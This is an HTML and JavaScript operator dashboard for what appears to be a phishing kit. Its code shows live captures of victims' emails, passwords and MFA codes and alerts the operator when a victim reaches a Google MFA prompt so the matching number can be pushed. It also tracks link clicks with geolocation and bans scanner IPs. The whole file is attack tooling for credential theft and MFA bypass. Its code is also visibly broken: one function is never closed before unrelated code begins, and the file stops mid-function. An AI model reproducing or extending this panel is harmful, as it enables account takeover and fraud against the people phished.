<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Control Center</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --blue: #007aff;
      --blue-soft: rgba(0,122,255,0.1);
      --red: #ff3b30;
      --red-soft: rgba(255,59,48,0.1);
      --green: #34c759;
      --green-soft: rgba(52,199,89,0.1);
      --yellow: #ff9f0a;
      --yellow-soft: rgba(255,159,10,0.1);
      --purple: #af52de;
      --purple-soft: rgba(175,82,222,0.1);
      --border: rgba(0,0,0,0.06);
      --glass: rgba(255,255,255,0.72);
      --glass-heavy: rgba(255,255,255,0.85);
      --bg: #f2f2f7;
      --text: #1c1c1e;
      --text-dim: #636366;
      --text-mute: #aeaeb2;
      --radius: 14px;
      --blur: blur(20px) saturate(180%);
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, 'SF Pro Display', 'Inter', BlinkMacSystemFont, sans-serif;
      -webkit-font-smoothing: antialiased;
      min-height: 100vh;
    }
    body::before {
      content: '';
      position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
      background: radial-gradient(ellipse at 20% 20%, rgba(0,122,255,0.08) 0%, transparent 50%),
                  radial-gradient(ellipse at 80% 80%, rgba(175,82,222,0.06) 0%, transparent 50%),
                  radial-gradient(ellipse at 50% 0%, rgba(255,159,10,0.05) 0%, transparent 40%);
      z-index: -1;
      animation: bgShift 20s ease-in-out infinite alternate;
    }
    @keyframes bgShift { 0% { transform: translate(0,0); } 100% { transform: translate(-3%,-2%); } }

    /* Topbar */
    .topbar {
      background: var(--glass);
      backdrop-filter: var(--blur);
      -webkit-backdrop-filter: var(--blur);
      border-bottom: 1px solid var(--border);
      position: sticky; top: 0; z-index: 100;
    }
    .topbar-inner {
      max-width: 960px;
      margin: 0 auto;
      padding: 12px 24px;
      display: flex; align-items: center; justify-content: space-between;
    }
    .topbar-left { display: flex; align-items: center; gap: 12px; }
    .topbar-logo {
      width: 34px; height: 34px;
      background: linear-gradient(135deg, var(--blue) 0%, #5856d6 100%);
      border-radius: 10px; display: flex; align-items: center; justify-content: center;
      box-shadow: 0 2px 8px rgba(0,122,255,0.3);
    }
    .topbar-logo svg { width: 17px; height: 17px; }
    .topbar h1 { font-size: 16px; font-weight: 700; letter-spacing: -0.02em; }
    .topbar-right { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
    .live { display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--green); font-weight: 600; }
    .live-dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; animation: pulse 2s infinite; box-shadow: 0 0 6px var(--green); }
    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
    .top-btn {
      padding: 6px 14px; border: none; border-radius: 10px;
      background: rgba(0,0,0,0.04); color: var(--text-dim); cursor: pointer;
      font-size: 12px; font-weight: 600; font-family: inherit;
      text-decoration: none; display: inline-flex; align-items: center; gap: 5px;
      transition: all 200ms cubic-bezier(.4,0,.2,1);
    }
    .top-btn:hover { background: rgba(0,0,0,0.08); color: var(--text); }

    /* Container */
    .container { max-width: 1600px; margin: 0 auto; padding: 24px 20px; }

    /* Stats */
    .stats { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-bottom: 24px; }
    .stat {
      background: var(--glass-heavy);
      backdrop-filter: var(--blur);
      -webkit-backdrop-filter: var(--blur);
      border: 1px solid var(--border);
      border-radius: var(--radius); padding: 18px;
      cursor: pointer; transition: all 250ms cubic-bezier(.4,0,.2,1);
    }
    .stat:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.06); }
    .stat:active { transform: scale(0.98); }
    .stat .num { font-size: 26px; font-weight: 800; letter-spacing: -0.03em; margin-bottom: 2px; }
    .stat .label { font-size: 11px; color: var(--text-mute); font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px; }
    .stat.red .num { color: var(--red); }
    .stat.green .num { color: var(--green); }
    .stat.blue .num { color: var(--blue); }
    .stat.yellow .num { color: var(--yellow); }
    .stat.purple .num { color: var(--purple); }

    /* Tabs */
    .tabs {
      display: flex; gap: 4px; margin-bottom: 20px; overflow-x: auto;
      background: rgba(0,0,0,0.04); border-radius: 12px; padding: 3px;
      scrollbar-width: none;
    }
    .tabs::-webkit-scrollbar { display: none; }
    .tab {
      padding: 8px 16px; font-size: 13px; font-weight: 600; color: var(--text-mute);
      cursor: pointer; border-radius: 10px; transition: all 200ms cubic-bezier(.4,0,.2,1);
      display: flex; align-items: center; gap: 5px; white-space: nowrap;
      border: none;
    }
    .tab:hover { color: var(--text-dim); }
    .tab.active {
      color: var(--text); background: #fff;
      box-shadow: 0 1px 4px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
    }

    /* Panels */
    .panel { display: none; animation: panelIn 300ms ease; }
    .panel.active { display: block; }
    @keyframes panelIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }

    /* Table */
    .table-card {
      background: var(--glass-heavy); backdrop-filter: var(--blur);
      -webkit-backdrop-filter: var(--blur);
      border: 1px solid var(--border); border-radius: var(--radius); overflow-x: auto;
    }
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th {
      text-align: left; padding: 8px 10px; color: var(--text-mute);
      font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;
      background: rgba(0,0,0,0.02); border-bottom: 1px solid var(--border);
    }
    td { padding: 10px 10px; border-bottom: 1px solid rgba(0,0,0,0.03); }
    tr:last-child td { border-bottom: none; }
    tr:hover td { background: rgba(0,122,255,0.03); }

    /* Badge */
    .badge {
      display: inline-flex; align-items: center; gap: 4px;
      padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700;
    }
    .badge.red { background: var(--red-soft); color: var(--red); }
    .badge.green { background: var(--green-soft); color: var(--green); }
    .badge.yellow { background: var(--yellow-soft); color: var(--yellow); }
    .badge.blue { background: var(--blue-soft); color: var(--blue); }
    .badge.purple { background: var(--purple-soft); color: var(--purple); }

    /* Buttons */
    .btn {
      padding: 7px 14px; border: none; border-radius: 10px;
      background: rgba(0,0,0,0.04); color: var(--text-dim); cursor: pointer;
      font-size: 12px; font-weight: 600; font-family: inherit;
      transition: all 200ms cubic-bezier(.4,0,.2,1);
    }
    .btn:hover { background: rgba(0,0,0,0.08); color: var(--text); }
    .btn:active { transform: scale(0.96); }
    .btn.green { color: var(--green); background: var(--green-soft); }
    .btn.green:hover { background: rgba(52,199,89,0.18); }
    .btn.red { color: var(--red); background: var(--red-soft); }
    .btn.red:hover { background: rgba(255,59,48,0.18); }
    .btn.blue { color: #fff; background: var(--blue); }
    .btn.blue:hover { background: #0066e0; box-shadow: 0 4px 12px rgba(0,122,255,0.3); }

    /* Collapsible dropbox */
    .dropbox {
      background: var(--glass-heavy); backdrop-filter: var(--blur); -webkit-backdrop-filter: var(--blur);
      border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 12px; overflow: hidden;
      transition: box-shadow 200ms ease;
    }
    .dropbox[open] { box-shadow: 0 4px 16px rgba(0,0,0,0.06); }
    .dropbox > summary {
      list-style: none; cursor: pointer; padding: 14px 18px;
      display: flex; align-items: center; gap: 10px;
      font-size: 14px; font-weight: 700; color: var(--text);
      user-select: none; transition: background 150ms ease;
    }
    .dropbox > summary::-webkit-details-marker { display: none; }
    .dropbox > summary:hover { background: rgba(0,0,0,0.02); }
    .dropbox > summary .chev {
      margin-left: auto; transition: transform 200ms ease; color: var(--text-mute); font-size: 12px;
    }
    .dropbox[open] > summary .chev { transform: rotate(90deg); }
    .dropbox > summary .count {
      display: inline-flex; align-items: center; justify-content: center;
      min-width: 22px; height: 22px; padding: 0 8px; border-radius: 11px;
      background: var(--blue-soft); color: var(--blue);
      font-size: 11px; font-weight: 700;
    }
    .dropbox > .dropbox-body {
      padding: 0 18px 16px; border-top: 1px solid var(--border);
      animation: dropboxIn 200ms ease;
    }
    @keyframes dropboxIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
    .dropbox-actions { display: flex; justify-content: flex-end; gap: 8px; margin: 12px 0 6px; }

    /* Empty */
    .empty { text-align: center; padding: 48px 24px; color: var(--text-mute); }
    .empty i { font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.2; }
    .empty p { font-size: 14px; font-weight: 500; }

    .sa-only { display: none !important; }
    body.is-superadmin .sa-only.tab { display: flex !important; }
    body.is-superadmin .sa-only.panel { display: none !important; }
    body.is-superadmin .sa-only.panel.active { display: block !important; }

    /* User / invite forms */
    .user-form {
      background: var(--glass-heavy); backdrop-filter: var(--blur);
      -webkit-backdrop-filter: var(--blur);
      border: 1px solid var(--border); border-radius: var(--radius);
      padding: 20px; margin-bottom: 16px;
    }
    .user-form h3 { font-size: 14px; font-weight: 700; margin-bottom: 16px; }
    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .form-field { display: flex; flex-direction: column; gap: 4px; }
    .form-field label { font-size: 12px; font-weight: 600; color: var(--text-dim); }
    .form-field input, .form-field select, .form-field textarea {
      padding: 10px 14px; border: 1px solid var(--border); border-radius: 10px;
      font-size: 13px; font-family: inherit; outline: none;
      background: rgba(255,255,255,0.8); transition: all 200ms;
    }
    .form-field input:focus, .form-field select:focus, .form-field textarea:focus {
      border-color: var(--blue); box-shadow: 0 0 0 3px var(--blue-soft);
      background: #fff;
    }
    .form-field textarea { resize: vertical; min-height: 60px; }
    .form-field small { font-size: 11px; color: var(--text-mute); }
    .form-actions { margin-top: 14px; display: flex; gap: 8px; align-items: center; }
    .form-msg { font-size: 12px; margin-left: 8px; }

    /* Card list (logins, bans, strikes, clients, learned) */
    .login-list { display: flex; flex-direction: column; gap: 8px; }
    .login-card {
      background: var(--glass-heavy);
      backdrop-filter: var(--blur);
      -webkit-backdrop-filter: var(--blur);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 14px 18px;
      transition: all 200ms cubic-bezier(.4,0,.2,1);
    }
    .login-card:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(0,0,0,0.05); }
    .login-top { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; flex-wrap: wrap; }
    .login-email { font-weight: 700; font-size: 14px; color: var(--text); }
    .login-pass {
      background: var(--red-soft); color: var(--red); padding: 4px 12px;
      border-radius: 8px; font-size: 13px; font-family: 'SF Mono', 'Courier New', monospace;
      font-weight: 700; word-break: break-all;
    }
    .login-meta { display: flex; gap: 16px; flex-wrap: wrap; font-size: 12px; color: var(--text-mute); font-weight: 500; }
    .login-meta span { display: inline-flex; align-items: center; gap: 5px; }

    @media (max-width: 640px) {
      .stats { grid-template-columns: repeat(2, 1fr); }
      .form-grid { grid-template-columns: 1fr; }
      .topbar-inner { flex-wrap: wrap; gap: 8px; }
    }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="topbar-inner">
      <div class="topbar-left">
        <div class="topbar-logo">
          <svg viewBox="0 0 24 24" fill="none"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </div>
        <h1>Control Center</h1>
      </div>
      <div class="topbar-right">
        <span class="live"><span class="live-dot"></span> Live</span>
        <span id="topbar-user" style="font-size:12px;color:var(--text-dim);"></span>
        <button class="top-btn" onclick="loadAll()"><i class="fas fa-rotate"></i> Refresh</button>
        <a class="top-btn" onclick="location.href=BASE+'/logout'" href="#"><i class="fas fa-arrow-right-from-bracket"></i> Sign out</a>
      </div>
    </div>
  </div>

  <div class="container">
    <div class="stats" id="stats"></div>

    <div class="tabs" id="tabs">
      <div class="tab active" onclick="switchTab('logins',this)"><i class="fas fa-key" style="margin-right:4px"></i>Logins</div>
      <div class="tab" onclick="switchTab('banned',this)">Banned IPs</div>
      <div class="tab" onclick="switchTab('strikes',this)">Strikes</div>
      <div class="tab" onclick="switchTab('links',this)"><i class="fas fa-link" style="margin-right:4px"></i>Links</div>
      <div class="tab sa-only" onclick="switchTab('learned',this)">Learned</div>
      <div class="tab sa-only" onclick="switchTab('providers',this)">Providers</div>
      <div class="tab sa-only" onclick="switchTab('users',this)"><i class="fas fa-users" style="margin-right:4px"></i>Users</div>
      <div class="tab" onclick="switchTab('settings',this)"><i class="fas fa-gear" style="margin-right:4px"></i>Settings</div>
    </div>

    <div class="panel active" id="p-logins"></div>
    <div class="panel" id="p-banned"></div>
    <div class="panel" id="p-strikes"></div>
    <div class="panel" id="p-links"></div>
    <div class="panel sa-only" id="p-learned"></div>
    <div class="panel sa-only" id="p-providers"></div>
    <div class="panel sa-only" id="p-users"></div>
    <div class="panel" id="p-settings"></div>
  </div>

  <!-- Toast + Modal system (replaces native alert/confirm) -->
  <div id="cc-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:9999;align-items:center;justify-content:center;backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);animation:ccFade .15s ease-out;">
    <div style="background:#fff;border-radius:18px;max-width:420px;width:90%;padding:26px 24px 20px;box-shadow:0 24px 60px rgba(0,0,0,.22);font-family:-apple-system,'SF Pro Display','Inter',BlinkMacSystemFont,sans-serif;animation:ccPop .18s cubic-bezier(.2,.8,.3,1.2);">
      <div id="cc-modal-icon" style="width:44px;height:44px;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;border-radius:50%;font-size:20px;"></div>
      <h3 id="cc-modal-title" style="margin:0 0 8px;font-size:17px;font-weight:700;text-align:center;color:#1c1c1e;"></h3>
      <p id="cc-modal-body" style="margin:0 0 20px;font-size:13.5px;color:#6b6b70;text-align:center;line-height:1.5;"></p>
      <div id="cc-modal-actions" style="display:flex;gap:8px;"></div>
    </div>
  </div>
  <div id="cc-toast" style="display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:10000;padding:12px 20px;border-radius:12px;font-family:-apple-system,'SF Pro Display','Inter',sans-serif;font-size:13.5px;font-weight:500;box-shadow:0 8px 24px rgba(0,0,0,.18);max-width:90vw;"></div>
  <!-- Active Google MFA dock — appears when a victim is on the Google Prompt page; operator pushes the matching number from here. -->
  <div id="mfa-dock" style="display:none;position:fixed;bottom:18px;right:18px;z-index:9999;width:340px;max-width:calc(100vw - 24px);font-family:-apple-system,'SF Pro Display','Inter',sans-serif;"></div>

  <!-- Live Activity drawer — streams every server-side event (captures, MFA, links, bans) so the operator sees the campaign breathe in real time. -->
  <button id="live-toggle" type="button" aria-label="Live activity" style="display:flex;align-items:center;justify-content:center;position:fixed;bottom:18px;left:18px;z-index:9999;width:48px;height:48px;border-radius:50%;border:none;background:#0a84ff;color:#fff;font-size:18px;cursor:pointer;box-shadow:0 8px 24px rgba(10,132,255,.35);font-family:-apple-system,'SF Pro Display','Inter',sans-serif;">
    <i class="fas fa-bolt"></i>
    <span id="live-badge" style="display:none;position:absolute;top:-4px;right:-4px;min-width:18px;height:18px;padding:0 5px;border-radius:9px;background:#ff3b30;color:#fff;font-size:11px;font-weight:700;line-height:18px;text-align:center;border:2px solid #fff;">0</span>
  </button>
  <div id="live-drawer" style="display:none;position:fixed;bottom:78px;left:18px;z-index:9998;width:360px;max-width:calc(100vw - 36px);height:min(560px, calc(100vh - 120px));background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.18), 0 4px 12px rgba(0,0,0,.06);display:none;flex-direction:column;overflow:hidden;font-family:-apple-system,'SF Pro Display','Inter',sans-serif;">
    <div style="display:flex;align-items:center;gap:8px;padding:14px 16px;border-bottom:1px solid #eef0f3;background:linear-gradient(180deg,#fafbfc,#fff);">
      <span style="display:inline-flex;width:8px;height:8px;background:#22c55e;border-radius:50%;animation:liveDot 1.4s ease-in-out infinite;"></span>
      <strong style="font-size:13px;color:#111827;">Live Activity</strong>
      <span id="live-count" style="font-size:11px;color:#6b7280;font-weight:500;margin-left:auto;">0 events</span>
      <button id="live-clear" type="button" title="Clear feed" style="border:0;background:transparent;color:#9ca3af;cursor:pointer;padding:4px 6px;font-size:13px;"><i class="fas fa-trash"></i></button>
      <button id="live-close" type="button" title="Close" style="border:0;background:transparent;color:#6b7280;cursor:pointer;padding:4px 6px;font-size:14px;"><i class="fas fa-xmark"></i></button>
    </div>
    <div id="live-list" style="flex:1;overflow-y:auto;padding:6px 6px;background:#f9fafb;"></div>
    <div style="padding:8px 14px;border-top:1px solid #eef0f3;font-size:10px;color:#9ca3af;text-align:center;background:#fff;">Streaming since this tab opened</div>
  </div>
  <style>
    @keyframes liveDot { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.5; transform:scale(.8); } }
    @keyframes liveItemIn { from { opacity:0; transform:translateY(-6px); background:#fff7ed; } to { opacity:1; transform:translateY(0); background:#fff; } }
    .live-row { display:flex; align-items:flex-start; gap:10px; padding:10px 12px; margin:4px 0; background:#fff; border-radius:10px; border-left:3px solid var(--lr-color, #9ca3af); animation: liveItemIn 1500ms cubic-bezier(.4,0,.2,1); }
    .live-row .lr-icon { flex-shrink:0; width:28px; height:28px; border-radius:7px; background:var(--lr-bg, #f3f4f6); color:var(--lr-color, #6b7280); display:flex; align-items:center; justify-content:center; font-size:12px; }
    .live-row .lr-body { flex:1; min-width:0; }
    .live-row .lr-msg { font-size:12.5px; color:#111827; line-height:1.35; word-break:break-word; }
    .live-row .lr-time { font-size:10px; color:#9ca3af; margin-top:2px; font-variant-numeric: tabular-nums; }
    .live-row.lr-pulse { box-shadow: 0 0 0 0 rgba(10,132,255,.4); animation: liveItemIn 1500ms cubic-bezier(.4,0,.2,1), liveItemPulse 2.4s ease-out; }
    @keyframes liveItemPulse { 0% { box-shadow: 0 0 0 0 rgba(10,132,255,.45); } 100% { box-shadow: 0 0 0 18px rgba(10,132,255,0); } }
    #live-toggle.has-unread { animation: liveBtnPulse 1.6s ease-in-out infinite; }
    @keyframes liveBtnPulse { 0%,100% { box-shadow: 0 8px 24px rgba(10,132,255,.35), 0 0 0 0 rgba(10,132,255,.35); } 50% { box-shadow: 0 8px 24px rgba(10,132,255,.35), 0 0 0 12px rgba(10,132,255,0); } }
  </style>
  <style>
    @keyframes ccFade { from { opacity:0 } to { opacity:1 } }
    @keyframes ccPop { from { transform:scale(.92); opacity:0 } to { transform:scale(1); opacity:1 } }
    @keyframes ccToastIn { from { transform:translateX(-50%) translateY(-20px); opacity:0 } to { transform:translateX(-50%) translateY(0); opacity:1 } }
    .cc-btn { flex:1; padding:11px 16px; border:0; border-radius:10px; font-size:14px; font-weight:600; font-family:inherit; cursor:pointer; transition:transform .1s, opacity .15s; }
    .cc-btn:hover { opacity:.88 }
    .cc-btn:active { transform:scale(.97) }
    .cc-btn-primary { background:#0a84ff; color:#fff }
    .cc-btn-danger { background:#ff3b30; color:#fff }
    .cc-btn-cancel { background:#f2f2f7; color:#1c1c1e }
  </style>

<script>
let currentUser = null;
const isSA = () => currentUser && currentUser.role === 'superadmin';
const J = 'application/json';
const post = (url, body) => fetch(url, { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify(body) });

function switchTab(name, el) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  el.classList.add('active');
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));

const BASE = '/u';

// ---- Realtime: SSE stream ----
let _liveSse = null;
// Returns true if the user has a generator form open or a result panel
// showing in the Links tab. While busy, do NOT auto-refresh — that would
// wipe their form / link / result panel.
function isLinksTabBusy() {
  const formC = document.getElementById('genlink-form-container');
  const resultC = document.getElementById('genlink-result');
  const linkDisplay = document.getElementById('invite-link-display');
  if (formC && formC.innerHTML.trim()) return true;
  if (resultC && resultC.innerHTML.trim()) return true;
  if (linkDisplay && linkDisplay.innerHTML.trim()) return true;
  return false;
}

function subscribeLive() {
  try { if (_liveSse) _liveSse.close(); } catch {}
  const es = new EventSource(BASE + '/api/stream');
  _liveSse = es;
  es.addEventListener('login', (e) => {
    try {
      const d = JSON.parse(e.data);
      const cidTag = d.cid ? ' ['+d.cid+']' : '';
      const cdmTag = d.cdm ? ' via '+d.cdm : '';
      const labelByType = { email: '✉️ Email', password: '🔓 Password', mfa: '🔐 MFA' };
      const label = labelByType[d.type] || '🔓 Password';
      showToast(label + ' captured: ' + (d.email || d.ip) + cidTag + cdmTag, 'success');
      pushLive(d.type === 'mfa' ? 'mfa-capture' : (d.type === 'password' ? 'pw-capture' : 'email-capture'),
               `${label} captured`, `${d.email || d.ip}${cidTag}${cdmTag}`, true);
    } catch {}
    loadLogins(); loadAll();
    // Skip the Links-tab refresh if the user is mid-generation (chameleon
    // / inbox / convert form open) or has the success panel showing — a
    // refresh would wipe their work.
    if (!isLinksTabBusy()) loadLinks();
  });
  es.addEventListener('ban', (e) => {
    try {
      const d = JSON.parse(e.data);
      showToast('🪤 IP trapped: ' + d.ip + ' (' + d.reason + ')', 'warn');
      pushLive('ban', 'IP trapped', `${d.ip} — ${d.reason}`);
    } catch {}
    loadAll();
  });
  es.addEventListener('visitor', (e) => {
    try {
      const d = JSON.parse(e.data);
      if (d.isNew) {
        const flag = d.geo && d.geo.countryCode ? flagEmoji(d.geo.countryCode) + ' ' : '';
        const loc  = d.geo && d.geo.city ? ` — ${d.geo.city}, ${d.geo.country || ''}` : (d.geo && d.geo.country ? ` — ${d.geo.country}` : '');
        showToast(`👁 New visitor: ${flag}${d.ip || '?'}${loc}`, 'info');
        pushLive('visitor', 'New visitor', `${flag}${d.ip || '?'}${loc}`);
      }
    } catch {}
    if (!isLinksTabBusy()) loadLinks();
  });
  es.addEventListener('geo', () => {
    // ASN/ISP arrived for a previously-seen IP — refresh the link cards if visible.
    if (!isLinksTabBusy()) loadLinks();
  });
  es.addEventListener('mfa-presence', (e) => {
    try {
      const d = JSON.parse(e.data);
      showToast('🟢 Victim on Google MFA: ' + (d.email || d.ip), 'info');
      pushLive('mfa-presence', 'Victim on Google MFA', d.email || d.ip || '?', true);
      // Layered hard-to-miss alerts: OS notification + audible chime + title pulse.
      // Operator can be on another tab and still get pulled in.
      mfaAlert(d.email || d.ip, d.ip || '');
    } catch {}
    loadActiveMfa();
  });
  es.addEventListener('mfa-push', (e) => {
    try {
      const d = JSON.parse(e.data);
      pushLive('mfa-push', `Number ${d.number} pushed`, d.email || d.ip || '?');
    } catch {}
    loadActiveMfa();
  });
  es.addEventListener('linkstats', (e) => {
    try {
      const d = JSON.parse(e.data);
      if (d && d.kind) {
        const labels = { click: '🖱 Link clicked', open: '👀 Link opened', email: '📧 Email entered', password: '🔑 Password submitted', mfa: '🛡 MFA submitted' };
        if (d.kind !== 'click' && d.kind !== 'open' && labels[d.kind]) {
          showToast(labels[d.kind], d.kind === 'mfa' ? 'success' : 'info');
        }
        if (labels[d.kind]) {
          pushLive('linkstats-' + d.kind, labels[d.kind], d.email || d.ip || '?',
                   d.kind === 'mfa' || d.kind === 'password');
        }
      }
    } catch {}
    if (!isLinksTabBusy()) loadLinks();
  });
  es.onerror = () => {
    // Auto-reconnect after 3s
    try { es.close(); } catch {}
    setTimeout(subscribeLive, 3000);
  };
}

// ---- Live Activity drawer ----
// Streams every SSE event into a scrollable feed. Closed by default; tag in
// bottom-left flashes + badges with unread count when events land while
// closed. Open it = mission-control feed of who's clicking, typing, getting
// banned, hitting MFA, etc.
const LIVE_MAX = 100;
const _liveEvents = [];               // newest at index 0
let _liveDrawerOpen = false;
let _liveUnread = 0;

const LIVE_TYPES = {
  'email-capture':     { color: '#3b82f6', bg: '#eff6ff', icon: 'fa-envelope' },
  'pw-capture':        { color: '#8b5cf6', bg: '#f5f3ff', icon: 'fa-key' },
  'mfa-capture':       { color: '#22c55e', bg: '#dcfce7', icon: 'fa-shield-halved' },
  'mfa-presence':      { color: '#0ea5e9', bg: '#e0f2fe', icon: 'fa-mobile-screen-button' },
  'mfa-push':          { color: '#10b981', bg: '#d1fae5', icon: 'fa-bullseye' },
  'visitor':           { color: '#6366f1', bg: '#eef2ff', icon: 'fa-eye' },
  'ban':               { color: '#ef4444', bg: '#fee2e2', icon: 'fa-ban' },
  'linkstats-click':   { color: '#a855f7', bg: '#faf5ff', icon: 'fa-arrow-pointer' },
  'linkstats-open':    { color: '#a855f7', bg: '#faf5ff', icon: 'fa-folder-open' },
  'linkstats-email':   { color: '#3b82f6', bg: '#eff6ff', icon: 'fa-envelope' },
  'linkstats-password':{ color: '#8b5cf6', bg: '#f5f3ff', icon: 'fa-key' },
  'linkstats-mfa':     { color: '#22c55e', bg: '#dcfce7', icon: 'fa-shield-halved' },
};

function pushLive(type, title, detail, pulse) {
  const meta = LIVE_TYPES[type] || { color: '#9ca3af', bg: '#f3f4f6', icon: 'fa-circle' };
  const entry = { type, title, detail, ts: Date.now(), meta, pulse: !!pulse };
  _liveEvents.unshift(entry);
  if (_liveEvents.length > LIVE_MAX) _liveEvents.length = LIVE_MAX;
  if (!_liveDrawerOpen) {
    _liveUnread++;
    const badge = document.getElementById('live-badge');
    if (badge) { badge.textContent = _liveUnread > 99 ? '99+' : String(_liveUnread); badge.style.display = ''; }
    const btn = document.getElementById('live-toggle');
    if (btn) btn.classList.add('has-unread');
  }
  renderLiveList();
}

function timeAgoShort(ts) {
  const s = Math.max(0, Math.floor((Date.now() - ts) / 1000));
  if (s < 5)   return 'just now';
  if (s < 60)  return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
  return Math.floor(s / 86400) + 'd ago';
}

function escLive(s) { return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c])); }

function renderLiveList() {
  const list = document.getElementById('live-list');
  const count = document.getElementById('live-count');
  if (!list) return;
  if (count) count.textContent = `${_liveEvents.length} event${_liveEvents.length === 1 ? '' : 's'}`;
  if (_liveEvents.length === 0) {
    list.innerHTML = '<div style="padding:36px 16px;text-align:center;color:#9ca3af;font-size:12px;"><i class="fas fa-bolt" style="display:block;font-size:22px;margin-bottom:8px;color:#d1d5db;"></i>Waiting for activity…</div>';
    return;
  }
  list.innerHTML = _liveEvents.map(e => `
    <div class="live-row${e.pulse ? ' lr-pulse' : ''}" style="--lr-color:${e.meta.color};--lr-bg:${e.meta.bg};">
      <div class="lr-icon"><i class="fas ${e.meta.icon}"></i></div>
      <div class="lr-body">
        <div class="lr-msg"><strong style="color:${e.meta.color}">${escLive(e.title)}</strong>${e.detail ? ' — ' + escLive(e.detail) : ''}</div>
        <div class="lr-time" data-live-ts="${e.ts}">${timeAgoShort(e.ts)}</div>
      </div>
    </div>`).join('');
}

function toggleLiveDrawer(open) {
  const drawer = document.getElementById('live-drawer');
  const btn = document.getElementById('live-toggle');
  const badge = document.getElementById('live-badge');
  if (!drawer) return;
  _liveDrawerOpen = (open === undefined) ? drawer.style.display === 'none' : !!open;
  drawer.style.display = _liveDrawerOpen ? 'flex' : 'none';
  if (_liveDrawerOpen) {
    _liveUnread = 0;
    if (badge) badge.style.display = 'none';
    if (btn) btn.classList.remove('has-unread');
    renderLiveList();
  }
}
document.addEventListener('DOMContentLoaded', () => {
  const tBtn = document.getElementById('live-toggle');
  const cBtn = document.getElementById('live-close');
  const xBtn = document.getElementById('live-clear');
  if (tBtn) tBtn.addEventListener('click', () => toggleLiveDrawer());
  if (cBtn) cBtn.addEventListener('click', () => toggleLiveDrawer(false));
  if (xBtn) xBtn.addEventListener('click', () => { _liveEvents.length = 0; renderLiveList(); });
});
// Refresh time-ago labels every 15s without re-rendering the whole list.
setInterval(() => {
  document.querySelectorAll('.lr-time[data-live-ts]').forEach(el => {
    const ts = parseInt(el.dataset.liveTs, 10);
    if (ts) el.textContent = timeAgoShort(ts);
  });
}, 15000);

// ---- Modal / Toast system (replaces native alert/confirm) ----
function showToast(msg, type) {
  const t = document.getElementById('cc-toast');
  if (!t) return;
  const colors = { success: ['#d1fae5','#065f46'], error: ['#fee2e2','#991b1b'], info: ['#e0f2fe','#075985'], warn: ['#fef3c7','#92400e'] };
  const [bg, fg] = colors[type] || colors.info;
  t.style.background = bg; t.style.color = fg;
  t.textContent = msg; t.style.display = 'block';
  t.style.animation = 'ccToastIn .25s cubic-bezier(.2,.8,.3,1.1)';
  clearTimeout(showToast._t);
  showToast._t = setTimeout(() => { t.style.display = 'none'; }, 3500);
}
function showModal({ title, body, type, confirmText, cancelText, danger }) {
  return new Promise(resolve => {
    const wrap = document.getElementById('cc-modal');
    const iconMap = {
      confirm: ['#fef3c7','#f59e0b','fa-circle-question'],
      danger:  ['#fee2e2','#ef4444','fa-triangle-exclamation'],
      info:    ['#e0f2fe','#0284c7','fa-circle-info'],
      success: ['#d1fae5','#10b981','fa-circle-check'],
      error:   ['#fee2e2','#ef4444','fa-circle-xmark'],
    };
    const t = type || (danger ? 'danger' : 'confirm');
    const [bg, fg, icon] = iconMap[t] || iconMap.info;
    const iconEl = document.getElementById('cc-modal-icon');
    iconEl.style.background = bg; iconEl.style.color = fg;
    iconEl.innerHTML = `<i class="fas ${icon}"></i>`;
    document.getElementById('cc-modal-title').textContent = title || '';
    document.getElementById('cc-modal-body').innerHTML = body || '';
    const actions = document.getElementById('cc-modal-actions');
    const close = (v) => { wrap.style.display = 'none'; resolve(v); };
    const btns = [];
    if (cancelText !== null) {
      btns.push(`<button class="cc-btn cc-btn-cancel" id="cc-modal-cancel">${cancelText || 'Cancel'}</button>`);
    }
